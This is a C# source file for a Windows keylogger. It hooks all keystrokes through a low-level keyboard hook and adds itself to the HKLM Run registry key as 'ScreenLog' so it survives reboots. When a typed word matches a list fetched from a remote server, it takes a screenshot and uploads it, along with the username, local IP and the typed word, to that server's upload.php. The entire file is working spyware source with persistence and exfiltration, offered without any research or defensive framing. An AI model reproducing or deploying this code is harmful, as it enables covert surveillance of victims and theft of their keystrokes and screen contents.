using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

using System.Diagnostics;
using System.Runtime.InteropServices;

using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Sockets;
using System.Collections.Specialized;
using System.IO;
using WebUtils;
using Microsoft.Win32;

namespace keystroke
{
    static class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string word = "";
        private static List<string> spy_list = new List<string>();

        private static string SERVER_ADDRESS = "";

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            String thisprocessname = Process.GetCurrentProcess().ProcessName;

            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
                return;


            try
            {
                RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
                object currentValue = read.GetValue("ScreenLog");

                if (currentValue == null || String.Compare(currentValue.ToString(), Application.ExecutablePath, true) != 0)
                {
                    RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    add.SetValue("ScreenLog", Application.ExecutablePath);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Please run as administrator");
                //return;
            }

            readConfigFile();
            getWordList();
            
            _hookID = SetHook(_proc);

            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static void readConfigFile()
        {
            StreamReader fs = new StreamReader("config.txt");

            string config = fs.ReadLine();
            SERVER_ADDRESS = config.Replace("Server_Address=", "").Trim();

            Console.WriteLine(SERVER_ADDRESS);

            fs.Close();
        }

        private static void getWordList()
        {
            string result = WebHttpUtils.getResponse("http://" + SERVER_ADDRESS + "/restapi.php?action=wordlist", "", "");
            if (string.IsNullOrEmpty(result))
            {
                return;
            }

            string []list = result.Split(',');
            for (int i = 0; i < list.Count(); i++)
            {
                spy_list.Add(list[i]);
            }
        }

        private static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        private static string takeScreenshot()
        {
            Bitmap memoryImage;

            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;

            memoryImage = new Bitmap(screenWidth, screenHeight);
            Size s = new Size(memoryImage.Width, memoryImage.Height);

            Graphics memoryGraphics = Graphics.FromImage(memoryImage);

            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);

            string urName = System.Environment.UserName;
            string ipAddr = GetLocalIPAddress();
            //That's it! Save the image in the directory and this will work like charm.  
            string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
                      @"\Screenshot" + "_" + urName + "_" + ipAddr + "_" +
                      DateTime.Now.ToString("(dd_MMM_yyyy_hh_mm_ss_tt)") + ".png");


            // save it  
            memoryImage.Save(fileName);

            return fileName;
        }

        private static void uploadImage(string path, string username, string ipaddr, string word)
        {
            try
            {
                WebClient client = new WebClient();
                string myFile = path;
                client.Credentials = CredentialCache.DefaultCredentials;

                NameValueCollection parameters = new NameValueCollection();
                parameters.Add("username", username);
                parameters.Add("ipaddr", ipaddr);
                parameters.Add("word", word);
                client.QueryString = parameters;

                client.UploadFile(@"http://" + SERVER_ADDRESS + "/upload.php", "POST", myFile);
                client.Dispose();
            }
            catch (Exception err)
            {
                MessageBox.Show(err.Message);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);

                if (vkCode == 13 || vkCode == 9 || vkCode == 32)
                {                    
                    bool exist = false;

                    for (int i = 0; i < spy_list.Count; i++)
                    {
                         if (word.ToLower().Contains(spy_list[i].ToLower()))
                        {
                            exist = true;
                            break;
                        }
                    }

                    if (exist == true)
                    {
                        string path = takeScreenshot();
                        string urName = System.Environment.UserName;
                        string ipAddr = GetLocalIPAddress();
                        uploadImage(path, urName, ipAddr, word);
                    }
                        
                    word = "";
                }
                else
                {
                    if (vkCode == 46)
                    {
                    }
                    else if (vkCode == 8)
                    {
                        if (word.Length > 0)
                            word = word.Substring(0, word.Length - 1);
                    }
                    else
                    {
                        char character = (char)vkCode;
                        word += character.ToString();
                    }
                        
                    Console.WriteLine(word);
                }

                
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
